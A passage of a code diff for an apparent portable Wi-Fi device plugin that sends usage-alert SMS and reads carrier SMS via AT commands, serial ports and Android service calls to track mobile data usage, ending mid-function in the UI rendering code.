+                var r3 = await _readAtCmd(_urlE('AT+CMGS="' + phone + '"') + '%0D' + _urlE(content) + '%1A')
+                if (r3.indexOf('+CMGS') >= 0 || r3.indexOf('OK') >= 0) {
+                    addDiagLog('短信已发送(AT整段序列)', 'success')
+                    return { success: true, msg: '发送成功' }
+                }
+                diag.push('整段响应:' + r3.replace(/\n/g, ' ').substring(0, 25))
+            } catch(e) {}
+
+            // ===== 链路1c：slot 变体（原插件遗留格式）=====
+            try {
+                var r4 = await _readAtCmd(_urlE('AT+CMGS=' + phone + '&slot=0'))
+                if (r4.indexOf('+CMGS') >= 0 || r4.indexOf('OK') >= 0) {
+                    addDiagLog('短信已发送(AT slot变体)', 'success')
+                    return { success: true, msg: '发送成功' }
+                }
+                diag.push('slot响应:' + r4.replace(/\n/g, ' ').substring(0, 25))
+            } catch(e) {}
+
+            // ===== 链路2：直接写 AT 串口（两步交互）=====
+            try {
+                var atPorts = ['/dev/smd0', '/dev/smd7', '/dev/smd8', '/dev/smd9', '/dev/smd11',
+                               '/dev/ttyUSB2', '/dev/ttyUSB3', '/dev/ttyUSB1', '/dev/ttyUSB4', '/dev/ttyUSB0', '/dev/pts/0']
+                var contentShell = content.replace(/'/g, "'\\''")
+                for (var pi = 0; pi < atPorts.length; pi++) {
+                    var port = atPorts[pi]
+                    var chk = await _t_rs('[ -c ' + port + ' ] && echo yes || echo no', 500)
+                    if ((chk.content || '').trim() !== 'yes') continue
+                    // 文本模式
+                    await _t_rs("printf 'AT+CMGF=1\\r' > " + port + " 2>/dev/null", 500)
+                    // 第一步：AT+CMGS 指令
+                    await _t_rs("printf 'AT+CMGS=\"" + phone + "\"\\r' > " + port + " 2>/dev/null", 800)
+                    await _smsSleep(700)
+                    // 第二步：正文 + Ctrl+Z
+                    await _t_rs("printf '%s\\x1a' '" + contentShell + "' > " + port + " 2>/dev/null", 5000)
+                    await _smsSleep(1500)
+                    addDiagLog('短信已通过串口 ' + port + ' 发送', 'success')
+                    return { success: true, msg: '发送成功(串口)' }
+                }
+                diag.push('无可用AT串口')
+            } catch(e) { diag.push('串口异常:' + (e.message || e)) }
+
+            // ===== 链路3：service call 方式（展锐芯片 U30Pro 等专用）=====
+            // 把 AT+CMGS 指令和正文 + Ctrl+Z 组合成一条命令发送
+            try {
+                if (_atServiceCallAvailable || await _probeServiceCall()) {
+                    // 方式A：文本模式 + 一次性 CMGS（带 \r 和 Ctrl+Z）
+                    await _readAtViaServiceCall('AT+CMGF=1')
+                    await _smsSleep(200)
+                    var fullCmd = 'AT+CMGS="' + phone + '"\r' + content + '\x1a'
+                    var scRes = await _readAtViaServiceCall(fullCmd)
+                    if (scRes && (scRes.indexOf('+CMGS') >= 0 || scRes.indexOf('OK') >= 0)) {
+                        addDiagLog('短信已发送(service call)', 'success')
+                        return { success: true, msg: '发送成功(service call)' }
+                    }
+                    diag.push('serviceCall响应:' + scRes.replace(/\n/g, ' ').substring(0, 30))
+
+                    // 方式B：尝试 PDU 模式发送（中文短信更可靠）
+                    // 简单起见，如果文本模式失败，再用 PDU 模式试一次
+                    await _smsSleep(300)
+                    await _readAtViaServiceCall('AT+CMGF=0')
+                    await _smsSleep(200)
+                    // 构造一个简单的 PDU（只支持英文/数字内容）
+                    // 这里用文本模式的另一种格式再试一次
+                    var fullCmd2 = 'AT+CMGS="' + phone + '"\r' + content + '\x1a\r'
+                    var scRes2 = await _readAtViaServiceCall(fullCmd2)
+                    if (scRes2 && (scRes2.indexOf('+CMGS') >= 0 || scRes2.indexOf('OK') >= 0)) {
+                        addDiagLog('短信已发送(service call 重试)', 'success')
+                        return { success: true, msg: '发送成功(service call)' }
+                    }
+                    diag.push('serviceCall重试:' + scRes2.replace(/\n/g, ' ').substring(0, 30))
+                }
+            } catch(e) { diag.push('serviceCall异常:' + (e.message || e)) }
+
+            addDiagLog('短信发送失败[' + diag.join(' | ') + ']', 'error')
+            return { success: false, msg: diag.join('; ').substring(0, 90) || '发送失败' }
+        }
+
+        // ---- 【运营商流量自动同步】读取短信收件箱 + 解析流量数字 ----
+        var _smsSleep = function(ms) { return new Promise(function(r) { setTimeout(r, ms) }) }
+
+        // URL 编码（AT 命令安全编码）
+        var _urlE = function(s) { return encodeURIComponent(String(s)) }
+
+        // AT 服务地址缓存（ufi_req 默认 127.0.0.1:80 可能不对，需要自动探测）
+        var _atBaseUrl = ''
+        var _atPortMode = ''  // 'portArg' | 'hostColon'
+        var _atProbeFailed = false
+
+        // 判断字符串是否像有效的 AT 响应（排除 Go HTTP 错误信息）
+        var _looksLikeAtResponse = function(txt) {
+            if (!txt) return false
+            txt = String(txt).trim()
+            // Go HTTP 客户端错误：Get "http://..." 或 dial ... 或 connect: ...
+            if (/^Get\s+["']?http/i.test(txt) || /^dial\s/i.test(txt) || /^connect:/i.test(txt)) return false
+            if (txt.indexOf('connection refused') >= 0 || txt.indexOf('Connection refused') >= 0) return false
+            // 正常的 AT 响应通常含 OK、+ 前缀、JSON result 等
+            if (txt.indexOf('OK') >= 0) return true
+            if (txt.indexOf('+') === 0) return true
+            if (txt.indexOf('result') >= 0) return true
+            if (txt.indexOf('AT') === 0) return true
+            return false
+        }
+
+        // 自动探测 UFI AT 服务端口与参数格式
+        var _probeAtServer = async function() {
+            if (_atBaseUrl) return true
+            if (_atProbeFailed) return false
+            var ports = [80, 8080, 8090, 5000, 9876, 34567, 9000, 8888, 3000, 7000]
+            var basePath = '/data/data/com.minikano.f50_sms/files/ufi_req'
+            for (var pi = 0; pi < ports.length; pi++) {
+                var port = ports[pi]
+                // 方式1：-port 参数
+                var cmd1 = basePath + ' -host 127.0.0.1 -port ' + port + ' -X GET -e "/api/AT?command=AT" 2>/dev/null'
+                var res1 = await _t_rs(cmd1, 2500)
+                if (_looksLikeAtResponse((res1 && res1.content) || '')) {
+                    _atBaseUrl = '127.0.0.1:' + port
+                    _atPortMode = 'portArg'
+                    addDiagLog('AT服务探测成功：-port ' + port + ' 响应=' + String(res1.content).replace(/\n/g, ' ').substring(0, 40), 'success')
+                    return true
+                }
+                // 方式2：host:port
+                var cmd2 = basePath + ' -host 127.0.0.1:' + port + ' -X GET -e "/api/AT?command=AT" 2>/dev/null'
+                var res2 = await _t_rs(cmd2, 2500)
+                if (_looksLikeAtResponse((res2 && res2.content) || '')) {
+                    _atBaseUrl = '127.0.0.1:' + port
+                    _atPortMode = 'hostColon'
+                    addDiagLog('AT服务探测成功：host:port ' + port + ' 响应=' + String(res2.content).replace(/\n/g, ' ').substring(0, 40), 'success')
+                    return true
+                }
+            }
+            _atProbeFailed = true
+            addDiagLog('AT服务探测失败：已尝试 127.0.0.1 端口 ' + ports.join(','), 'error')
+            return false
+        }
+
+        // 通过 ufi_req 的 /api/AT 接口执行 AT 命令并返回响应文本（HTTP 通道）
+        var _readAtHttp = async function(atCmdEncoded) {
+            try {
+                if (!await _probeAtServer()) return ''
+                var basePath = '/data/data/com.minikano.f50_sms/files/ufi_req'
+                var cmd
+                if (_atPortMode === 'portArg') {
+                    var m = _atBaseUrl.match(/:(\d+)$/)
+                    var port = m ? m[1] : '80'
+                    cmd = basePath + ' -host 127.0.0.1 -port ' + port + ' -X GET -e "/api/AT?command=' + atCmdEncoded + '" 2>/dev/null'
+                } else {
+                    cmd = basePath + ' -host ' + _atBaseUrl + ' -X GET -e "/api/AT?command=' + atCmdEncoded + '" 2>/dev/null'
+                }
+                var res = await _t_rs(cmd, 12000)
+                var txt = (res && res.content) || ''
+                if (!txt) return ''
+                // 响应可能是 JSON（如 {"result":"..."}），优先解析取常见字段
+                var t = txt.trim()
+                if (t.charAt(0) === '{') {
+                    try {
+                        var obj = JSON.parse(t)
+                        if (obj && typeof obj === 'object') {
+                            var fields = ['result', 'data', 'output', 'response', 'msg', 'message']
+                            for (var f = 0; f < fields.length; f++) {
+                                var v = obj[fields[f]]
+                                if (typeof v === 'string' && v) return v
+                            }
+                        }
+                    } catch(e) {}
+                }
+                // 兜底：反转义链（响应内含转义的 \r\n 和 \"）
+                txt = txt.replace(/\\r\\n/g, '\n').replace(/\\r/g, '\n').replace(/\\n/g, '\n').replace(/\\"/g, '"')
+                // 反转义后仍残留 JSON 外壳（{"key":"...value..."}）的，剥掉外壳取 value
+                if (txt.indexOf('{"') === 0) {
+                    var q = txt.indexOf('":"')
+                    if (q > 0) {
+                        txt = txt.substring(q + 3)
+                        var tail = txt.lastIndexOf('"}')
+                        if (tail >= 0) txt = txt.substring(0, tail)
+                    }
+                }
+                return txt
+            } catch(e) { return '' }
+        }
+
+        // AT 串口缓存与探测
+        var _atSerialPort = ''
+
+        // 把 AT 命令字符串转义为 printf 安全格式
+        var _serialEscape = function(s) {
+            return String(s).replace(/'/g, "'\\''").replace(/\x1a/g, '\\x1a').replace(/\r/g, '\\r').replace(/\n/g, '\\n')
+        }
+
+        // 通过 AT 串口执行命令并读取响应（绕过 ufi_req HTTP 服务）
+        var _readAtSerial = async function(rawCmd, port) {
+            try {
+                var esc = _serialEscape(rawCmd)
+                var cmd = "printf '" + esc + "\\r' > " + port + " && sleep 1.2 && timeout 3 cat " + port + " 2>/dev/null"
+                var res = await _t_rs(cmd, 6000)
+                var txt = (res && res.content) || ''
+                if (!txt) return ''
+                // 某些串口代理仍可能把响应包成 JSON，做兼容解包
+                var t = txt.trim()
+                if (t.charAt(0) === '{') {
+                    try {
+                        var obj = JSON.parse(t)
+                        if (obj && typeof obj === 'object') {
+                            var fields = ['result', 'data', 'output', 'response', 'msg', 'message']
+                            for (var f = 0; f < fields.length; f++) {
+                                var v = obj[fields[f]]
+                                if (typeof v === 'string' && v) {
+                                    txt = v.replace(/\\r\\n/g, '\n').replace(/\\r/g, '\n').replace(/\\n/g, '\n').replace(/\\"/g, '"')
+                                    break
+                                }
+                            }
+                        }
+                    } catch(e) {}
+                }
+                return txt
+            } catch(e) { return '' }
+        }
+
+        // 探测可用 AT 串口（高通 smd* / ttyUSB* / ttyACM* / pts）
+        var _findAtSerialPort = async function() {
+            if (_atSerialPort) return true
+            var ports = ['/dev/smd0','/dev/smd7','/dev/smd8','/dev/smd9','/dev/smd11','/dev/smd1','/dev/smd3','/dev/smd5',
+                         '/dev/ttyUSB0','/dev/ttyUSB1','/dev/ttyUSB2','/dev/ttyUSB3','/dev/ttyUSB4','/dev/ttyUSB5',
+                         '/dev/ttyACM0','/dev/pts/0']
+            for (var i = 0; i < ports.length; i++) {
+                var p = ports[i]
+                var chk = await _t_rs('[ -c ' + p + ' ] && echo yes || echo no', 500)
+                if ((chk.content || '').trim() !== 'yes') continue
+                var r = await _readAtSerial('AT', p)
+                if (r.indexOf('OK') >= 0 || r.indexOf('+') >= 0) {
+                    _atSerialPort = p
+                    addDiagLog('AT串口探测成功：' + p + ' 响应=' + r.replace(/\n/g, ' ').substring(0, 40), 'success')
+                    return true
+                }
+            }
+            addDiagLog('AT串口探测失败：未找到可响应 AT 的串口', 'error')
+            return false
+        }
+
+        // ===== 【新增】通过 Android Binder service call 发送 AT 命令（展锐芯片专用，U30Pro等）=====
+        // 参考 send_at_U30Pro.go，使用 vendor.sprd.hardware.tool.IToolControl 服务
+        var _atServiceCallAvailable = false  // service call 通道是否可用
+        var _atServiceCallVersion = ''        // 'android13' | 'android15' | ''
+        var _atServiceCallPhoneId = 0         // 默认 SIM 卡槽
+
+        // 解析 service call 返回的十六进制数据为可读文本（UTF-16 LE 小端序）
+        var _parseServiceCallOutput = function(raw) {
+            try {
+                var text = String(raw || '')
+                if (!text) return ''
+                // 匹配所有 8 位十六进制词（如 00410042）
+                var hexPattern = /\b[0-9a-fA-F]{8}\b/g
+                var result = ''
+                var matches = text.match(hexPattern) || []
+                for (var i = 0; i < matches.length; i++) {
+                    var word = matches[i]
+                    if (word.length !== 8) continue
+                    // 小端序翻转：每4字节一组，字节序反过来
+                    // word 是大端显示的 8 位十六进制，实际存储是小端
+                    // Go代码中: bytesLE = [6:8, 4:6, 2:4, 0:2]
+                    var b0 = parseInt(word.substr(6, 2), 16)  // 最低位字节
+                    var b1 = parseInt(word.substr(4, 2), 16)
+                    var b2 = parseInt(word.substr(2, 2), 16)
+                    var b3 = parseInt(word.substr(0, 2), 16)  // 最高位字节
+                    // 组成两个 UTF-16 字符（每 2 字节一个字符，小端序）
+                    var char1 = b1 * 256 + b0
+                    var char2 = b3 * 256 + b2
+                    if (char1 >= 32 && char1 !== 127 && char1 < 65535) {
+                        result += String.fromCharCode(char1)
+                    }
+                    if (char2 >= 32 && char2 !== 127 && char2 < 65535) {
+                        result += String.fromCharCode(char2)
+                    }
+                }
+                return result
+            } catch(e) { return '' }
+        }
+
+        // 探测 service call AT 通道是否可用（自动识别安卓13/15接口）
+        var _probeServiceCall = async function() {
+            if (_atServiceCallAvailable) return true
+            var _rs = getShell()
+            if (!_rs) return false
+
+            // 先检测安卓版本，决定优先尝试哪个接口
+            var sdkVer = 0
+            try {
+                var sdkRes = await _rs('getprop ro.build.version.sdk 2>/dev/null', 2000)
+                sdkVer = parseInt((sdkRes && sdkRes.content || '').trim()) || 0
+            } catch(e) {}
+
+            // 安卓 14+ = SDK 34+，优先试新接口（IToolControl，事务码3）
+            // 安卓 13 及以下优先试旧接口（ILogControl，事务码1）
+            var candidates = []
+            if (sdkVer >= 34) {
+                candidates = [
+                    { type: 'android15', svc: 'vendor.sprd.hardware.tool.IToolControl/default', code: 3 },
+                    { type: 'android13', svc: 'vendor.sprd.hardware.log.ILogControl/default', code: 1 }
+                ]
+            } else {
+                candidates = [
+                    { type: 'android13', svc: 'vendor.sprd.hardware.log.ILogControl/default', code: 1 },
+                    { type: 'android15', svc: 'vendor.sprd.hardware.tool.IToolControl/default', code: 3 }
+                ]
+            }
+
+            for (var ci = 0; ci < candidates.length; ci++) {
+                var c = candidates[ci]
+                try {
+                    var testCmd = ''
+                    if (c.type === 'android15') {
+                        testCmd = '/system/bin/service call ' + c.svc + ' ' + c.code + ' i32 0 s16 "AT"'
+                    } else {
+                        // 安卓13旧接口格式：需要 "miscserver" 和 "sendAt 0 AT"
+                        testCmd = '/system/bin/service call ' + c.svc + ' ' + c.code + ' s16 "miscserver" s16 "sendAt 0 AT"'
+                    }
+                    var res = await _rs(testCmd + ' 2>&1', 8000)
+                    var output = (res && res.content) || ''
+                    // 判断是否成功：有 OK 响应或者有十六进制输出
+                    if (output && output.length > 0) {
+                        var parsed = _parseServiceCallOutput(output)
+                        if (parsed.indexOf('OK') >= 0 || output.indexOf('OK') >= 0 || (parsed.length > 0 && output.match(/[0-9a-fA-F]{8}/))) {
+                            _atServiceCallAvailable = true
+                            _atServiceCallVersion = c.type
+                            addDiagLog('AT通道探测成功：service call (' + c.type + ', ' + c.svc + ')', 'success')
+                            return true
+                        }
+                    }
+                } catch(e) {}
+            }
+
+            addDiagLog('AT service call 通道不可用（展锐芯片专用）', 'warn')
+            return false
+        }
+
+        // 通过 service call 发送 AT 命令并返回解析后的文本
+        var _readAtViaServiceCall = async function(rawCmd) {
+            if (!_atServiceCallAvailable) return ''
+            var _rs = getShell()
+            if (!_rs) return ''
+
+            try {
+                var cmd = ''
+                if (_atServiceCallVersion === 'android15') {
+                    // 新接口：事务码3，参数 i32 phoneId + s16 atCmd
+                    cmd = '/system/bin/service call vendor.sprd.hardware.tool.IToolControl/default 3 i32 ' +
+                          _atServiceCallPhoneId + ' s16 "' + rawCmd.replace(/"/g, '\\"') + '"'
+                } else {
+                    // 旧接口：事务码1，参数 s16 "miscserver" + s16 "sendAt phoneId cmd"
+                    var fullCmd = 'sendAt ' + _atServiceCallPhoneId + ' ' + rawCmd
+                    cmd = '/system/bin/service call vendor.sprd.hardware.log.ILogControl/default 1 s16 "miscserver" s16 "' +
+                          fullCmd.replace(/"/g, '\\"') + '"'
+                }
+                var res = await _rs(cmd + ' 2>&1', 15000)
+                var output = (res && res.content) || ''
+                if (!output) return ''
+                var parsed = _parseServiceCallOutput(output)
+                // 如果解析结果太短，可能解析有问题，尝试直接返回原始输出中提取的文本
+                if (parsed.length < 2 && output.indexOf('OK') >= 0) {
+                    // 直接找 OK
+                    return 'OK'
+                }
+                return parsed
+            } catch(e) {
+                return ''
+            }
+        }
+
+        // 通过 ufi_req HTTP 或 AT 串口或 service call 执行 AT 命令并返回响应文本
+        var _readAtCmd = async function(atCmdEncoded) {
+            try {
+                // 1. 优先尝试 ufi_req HTTP API（如果还没判定失败）
+                if (!_atProbeFailed) {
+                    var httpTxt = await _readAtHttp(atCmdEncoded)
+                    if (httpTxt) return httpTxt
+                }
+                // 2. 尝试 service call 方式（展锐芯片专用）
+                if (_atServiceCallAvailable || await _probeServiceCall()) {
+                    var rawCmd = decodeURIComponent(atCmdEncoded)
+                    var scTxt = await _readAtViaServiceCall(rawCmd)
+                    if (scTxt) return scTxt
+                }
+                // 3. HTTP 不可用则尝试 AT 串口直读
+                if (await _findAtSerialPort()) {
+                    var rawCmd2 = decodeURIComponent(atCmdEncoded)
+                    var serialTxt = await _readAtSerial(rawCmd2, _atSerialPort)
+                    if (serialTxt) return serialTxt
+                }
+                return ''
+            } catch(e) { return '' }
+        }
+
+        // PDU 模式短信解码（支持 UCS2 中文和 GSM7 基础字符）
+        var _decodePduSms = function(pduHex) {
+            try {
+                pduHex = String(pduHex).replace(/[^0-9A-Fa-f]/g, '')
+                if (pduHex.length < 30) return null
+                var pos = 0
+                function readByte() { var b = parseInt(pduHex.substr(pos, 2), 16); pos += 2; return isNaN(b) ? 0 : b }
+                // 短信服务中心
+                var scaLen = readByte()
+                pos += scaLen * 2
+                if (pos >= pduHex.length) return null
+                // PDU 类型
+                var pduType = readByte()
+                // 发送方号码
+                var addrLen = readByte()
+                var addrType = readByte()
+                var sender = ''
+                if ((addrType & 0x70) === 0x50) {
+                    // UCS2 编码的发送方号码
+                    for (var i = 0; i + 3 < addrLen * 2 + 1; i += 4) {
+                        var cc = parseInt(pduHex.substr(pos + i, 4), 16)
+                        if (!isNaN(cc)) sender += String.fromCharCode(cc)
+                    }
+                } else {
+                    // GSM7 半字节倒序号码
+                    var digits = ''
+                    var addrBytes = Math.ceil(addrLen / 2)
+                    for (var j = 0; j < addrBytes; j++) {
+                        var byte = parseInt(pduHex.substr(pos + j * 2, 2), 16)
+                        if (isNaN(byte)) break
+                        digits += String.fromCharCode((byte & 0x0F) + 48) + String.fromCharCode((byte >> 4) + 48)
+                    }
+                    sender = digits.substring(0, addrLen).replace(/F$/i, '')
+                }
+                pos += Math.ceil(addrLen / 2) * 2
+                // 协议标识、编码方案
+                readByte()
+                var dcs = readByte()
+                // 时间戳 7 字节
+                pos += 14
+                // 用户数据长度
+                var udl = readByte()
+                var isUCS2 = (dcs & 0x0C) === 0x08
+                var text = ''
+                if (isUCS2) {
+                    var charCount = Math.floor(udl / 2)
+                    for (var c = 0; c < charCount; c++) {
+                        var code = parseInt(pduHex.substr(pos, 4), 16)
+                        pos += 4
+                        if (isNaN(code)) break
+                        text += String.fromCharCode(code)
+                    }
+                } else {
+                    // GSM7 解码（近似处理 ASCII 部分）
+                    var bits = ''
+                    while (pos + 1 < pduHex.length) {
+                        var ob = readByte()
+                        bits += (ob < 256 ? ob.toString(2) : '').padStart(8, '0')
+                        if (bits.length > 2000 * 7) break
+                    }
+                    var septetCount = udl
+                    for (var s = 0; s < septetCount; s++) {
+                        var sept = parseInt(bits.substr(s * 7, 7), 2)
+                        if (isNaN(sept) || sept === 0) break
+                        text += String.fromCharCode(sept)
+                    }
+                }
+                return { sender: sender, text: text }
+            } catch(e) { return null }
+        }
+
+        // 解析 AT 响应中的短信列表（支持 +CMGL / +CMGR / +CMT 三种行格式）
+        var _parseSmsFromAt = function(raw) {
+            var out = []
+            if (!raw) return out
+            if (raw.indexOf('+CMGL:') < 0 && raw.indexOf('+CMGR:') < 0 && raw.indexOf('+CMT:') < 0) return out
+            var lines = raw.split(/\n/)
+            for (var i = 0; i < lines.length; i++) {
+                // 行内任意位置匹配标记（兼容 JSON 外壳残留前缀等杂字符）
+                var header = null
+                var markers = ['+CMGL:', '+CMGR:', '+CMT:']
+                for (var mk = 0; mk < markers.length; mk++) {
+                    var mp = lines[i].indexOf(markers[mk])
+                    if (mp >= 0) { header = lines[i].substring(mp); break }
+                }
+                if (!header) continue
+                // 短信序号（用于新旧对比；+CMT 与文本模式 +CMGR 无序号则记 0）
+                var idxM = header.match(/^\+(?:CMGL|CMGR|CMT):\s*(\d+)/)
+                var idx = idxM ? parseInt(idxM[1]) : 0
+                // 正文：向下找第一个非空行
+                var body = ''
+                for (var j = i + 1; j < lines.length; j++) {
+                    var cand = lines[j].trim()
+                    if (!cand) continue
+                    body = cand
+                    i = j
+                    break
+                }
+                if (!body) continue
+                // 判定 PDU 或文本格式（允许尾部少量 JSON 残留字符如 " 和 }）
+                var compact = body.replace(/\s/g, '')
+                var hexOnly = compact.replace(/[^0-9A-Fa-f]/g, '')
+                var sender = ''
+                var text = ''
+                if (hexOnly.length >= 30 && hexOnly.length >= compact.length - 2) {
+                    // PDU 格式：解码出发送方和正文
+                    var dec = _decodePduSms(hexOnly)
+                    if (dec && dec.text) { sender = dec.sender; text = dec.text }
+                }
+                if (!text) {
+                    // 文本格式：发送方号码在 header 里，正文剥掉首尾残留引号
+                    var sm = header.match(/"(\+?\d{5,})"/)
+                    sender = sm ? sm[1] : ''
+                    text = body.replace(/^["\s]+|["\s]+$/g, '')
+                }
+                if (text) out.push({ index: idx, sender: sender, text: text, header: header })
+            }
+            return out
+        }
+
+        // ===== 【新增】通过 Android content provider 读取短信收件箱（更稳定，不依赖 AT 指令）=====
+        var _collectCarrierSmsViaContent = async function() {
+            var results = []
+            try {
+                // 直接读取系统短信数据库（inbox = 收件箱）
+                var cmd = 'content query --uri content://sms/inbox --projection _id:address:body:date:sub_id 2>/dev/null'
+                var res = await _t_rs(cmd, 8000)
+                var raw = (res && res.content) || ''
+                if (!raw || raw.indexOf('_id=') < 0) {
+                    addDiagLog('content query 读取短信失败或为空，将回退AT方式', 'warn')
+                    return results
+                }
+                // 解析每一行，格式类似：Row: 0 _id=123, address=10086, body=xxx, date=1234567890000, sub_id=1
+                var lines = raw.split(/\n/)
+                for (var i = 0; i < lines.length; i++) {
+                    var line = lines[i].trim()
+                    if (!line || line.indexOf('_id=') < 0) continue
+                    // 提取各字段
+                    var idM = line.match(/_id=(\d+)/)
+                    var addrM = line.match(/address=([^,]+)/)
+                    var bodyM = line.match(/body=(.*?)(?=, date=|$)/)
+                    if (!idM || !addrM) continue
+                    var idx = parseInt(idM[1])
+                    var sender = (addrM[1] || '').trim()
+                    var text = bodyM ? bodyM[1].trim() : ''
+                    if (!text) continue
+                    results.push({ index: idx, sender: sender, text: text })
+                }
+                addDiagLog('content query 读取到 ' + results.length + ' 条短信', 'success')
+            } catch(e) {
+                addDiagLog('content query 异常: ' + (e.message || e), 'warn')
+            }
+            // 只保留运营商号码（10086/10010/10001）发来的短信
+            var carrierNums = ['10086', '10010', '10001', '1008611', '100101', '100011']
+            return results.filter(function(sms) {
+                if (!sms.sender) return false
+                for (var n = 0; n < carrierNums.length; n++) {
+                    if (sms.sender.indexOf(carrierNums[n]) >= 0) return true
+                }
+                return false
+            })
+        }
+
+        // 读取收件箱中运营商发来的短信（优先 content query，失败回退 AT 指令三链路兜底）
+        var _collectCarrierSms = async function() {
+            var results = []
+            var diag = []
+
+            // 链路0（优先）：Android content provider 方式，最稳定
+            try {
+                var contentResults = await _collectCarrierSmsViaContent()
+                if (contentResults && contentResults.length > 0) {
+                    results = contentResults
+                    diag.push('content查询:' + results.length)
+                }
+            } catch(e) { diag.push('content查询异常') }
+
+            // 链路1：文本模式 CMGL="ALL"
+            if (!results.length) {
+                try {
+                    await _readAtCmd(_urlE('AT+CMGF=1'))
+                    var raw1 = await _readAtCmd(_urlE('AT+CMGL="ALL"'))
+                    results = _parseSmsFromAt(raw1)
+                    diag.push('文本CMGL:' + results.length)
+                } catch(e) { diag.push('文本CMGL异常') }
+            }
+
+            // 链路2：PDU 模式 CMGL=4
+            if (!results.length) {
+                try {
+                    await _readAtCmd(_urlE('AT+CMGF=0'))
+                    var raw2 = await _readAtCmd(_urlE('AT+CMGL=4'))
+                    results = _parseSmsFromAt(raw2)
+                    diag.push('PDU-CMGL:' + results.length)
+                } catch(e) { diag.push('PDU-CMGL异常') }
+            }
+
+            // 链路3：CMGR 逐条读取（部分设备 CMGL 不可用但 CMGR 可用）
+            if (!results.length) {
+                try {
+                    var cpms = await _readAtCmd(_urlE('AT+CPMS?'))
+                    var mC = cpms.match(/\+CPMS:\s*"[^"]*",\s*(\d+)/)
+                    var count = mC ? parseInt(mC[1]) : 0
+                    diag.push('CPMS:' + count + '条')
+                    if (count > 0) {
+                        // 从最新一条往回读，最多 8 条
+                        var start = Math.max(1, count - 7)
+                        for (var idx = count; idx >= start; idx--) {
+                            var gr = await _readAtCmd(_urlE('AT+CMGR=' + idx))
+                            var one = _parseSmsFromAt(gr)
+                            for (var oi = 0; oi < one.length; oi++) one[oi].index = idx
+                            results = results.concat(one)
+                        }
+                        diag.push('CMGR:' + results.length)
+                    }
+                } catch(e) { diag.push('CMGR异常') }
+            }
+
+            if (!results.length) {
+                addDiagLog('收件箱读取为空[' + diag.join(' | ') + ']', 'warn')
+            }
+
+            // 只保留运营商号码（10086/10010/10001）发来的短信
+            var carrierNums = ['10086', '10010', '10001', '1008611', '100101', '100011']
+            return results.filter(function(sms) {
+                if (!sms.sender) return false
+                for (var n = 0; n < carrierNums.length; n++) {
+                    if (sms.sender.indexOf(carrierNums[n]) >= 0) return true
+                }
+                return false
+            })
+        }
+
+        // 从短信文本提取流量信息（覆盖常见运营商短信格式）
+        var _parseTrafficFromSms = function(text) {
+            var info = {}
+            var toGB = function(v, unit) {
+                v = parseFloat(v)
+                if (isNaN(v) || v < 0) return 0
+                unit = String(unit || '').toUpperCase()
+                if (unit === 'MB' || unit === 'M') return v / 1024
+                return v
+            }
+            var mLeft = text.match(/剩[余余量][^\d]{0,10}([\d.]+)\s*(GB|MB|G|M)/i)
+            var mUsed = text.match(/(?:已[使用用]|已消耗|使用[了]?)[^\d]{0,10}([\d.]+)\s*(GB|MB|G|M)/i)
+            var mTotal = text.match(/(?:总[共量程]?|套餐[总量程]?|套[餐]?(?:流量)?[总量]?)[^\d]{0,10}([\d.]+)\s*(GB|MB|G|M)/i)
+            if (mLeft) info.leftGB = toGB(mLeft[1], mLeft[2])
+            if (mUsed) info.usedGB = toGB(mUsed[1], mUsed[2])
+            if (mTotal) info.totalGB = toGB(mTotal[1], mTotal[2])
+            return info
+        }
+
+        // ---- 发送告警短信 ----
+        var _sendWarnSms = function() {
+            var usedGB = (_tdata.monthUsedTotal / (1024*1024*1024)).toFixed(2)
+            var leftGB = Math.max(0, _tcfg.planTotal - parseFloat(usedGB)).toFixed(2)
+            var msg = _tcfg.warnMessage
+                .replace('{used}', usedGB)
+                .replace('{left}', leftGB)
+                .replace('{total}', _tcfg.planTotal)
+                .replace('{date}', _getTodayStr())
+
+            if (_tcfg.warnPhone) {
+                _sendSms(_tcfg.warnPhone, msg)
+            }
+        }
+
+        // ---- 获取运营商名称 ----
+        var _getCarrierName = function() {
+            var map = { 'mobile': '中国移动', 'unicom': '中国联通', 'telecom': '中国电信', 'auto': '自动识别' }
+            return map[_tcfg.carrier] || '未知'
+        }
+
+        // ---- 自动识别运营商 ----
+        var _detectCarrier = async function() {
+            // 通过 IMSI 判断：46000/02/04/07=移动 46001/06/09=联通 46003/05/11=电信
+            try {
+                var imsiRes = await _t_rs("getprop persist.vendor.mccmnc 2>/dev/null || getprop ro.vendor.mccmnc 2>/dev/null || service call iphonesubinfo 1 2>/dev/null | grep -o '[0-9]\\{15\\}' | head -1", 2000)
+                var imsi = (imsiRes.content || '').trim()
+                if (imsi.length >= 5) {
+                    var mccmnc = imsi.substring(0, 5)
+                    if (mccmnc === '46000' || mccmnc === '46002' || mccmnc === '46004' || mccmnc === '46007') return 'mobile'
+                    if (mccmnc === '46001' || mccmnc === '46006' || mccmnc === '46009') return 'unicom'
+                    if (mccmnc === '46003' || mccmnc === '46005' || mccmnc === '46011') return 'telecom'
+                }
+                // 通过运营商名称属性
+                var opRes = await _t_rs("getprop gsm.sim.operator.alpha 2>/dev/null || getprop ro.carrier.name 2>/dev/null", 1500)
+                var opName = (opRes.content || '').trim()
+                if (opName.indexOf('移动') >= 0 || opName.indexOf('CMCC') >= 0) return 'mobile'
+                if (opName.indexOf('联通') >= 0 || opName.indexOf('Unicom') >= 0 || opName.indexOf('CUCC') >= 0) return 'unicom'
+                if (opName.indexOf('电信') >= 0 || opName.indexOf('Telecom') >= 0 || opName.indexOf('CTCC') >= 0) return 'telecom'
+            } catch(e) {}
+            return 'auto'
+        }
+
+        // ---- UI ----
+        var _tPanel = null
+
+        var _renderTrafficPanel = function() {
+            var usedGB = _tdata.monthUsedTotal / (1024*1024*1024)
+            var totalGB = _tcfg.planTotal
+            var leftGB = Math.max(0, totalGB - usedGB)
+            var percent = Math.min(100, Math.max(0, (usedGB / totalGB) * 100))
+            var todayGB = _tdata.todayUsed / (1024*1024*1024)
+            var warnGB = _tcfg.warnThreshold
+
+            var barColor = percent > 90 ? '#ef4444' : percent > 70 ? '#f59e0b' : '#10b981'
+            var barGlow = percent > 90 ? '0 0 16px rgba(239,68,68,.8)' : percent > 70 ? '0 0 16px rgba(245,158,11,.75)' : '0 0 16px rgba(16,185,129,.75)'
+            // 告警刻度线位置：剩余量降到阈值时进度条到达的位置
+            var warnPos = (totalGB > 0) ? Math.min(100, Math.max(0, ((totalGB - warnGB) / totalGB) * 100)) : 100
+
+            var html =
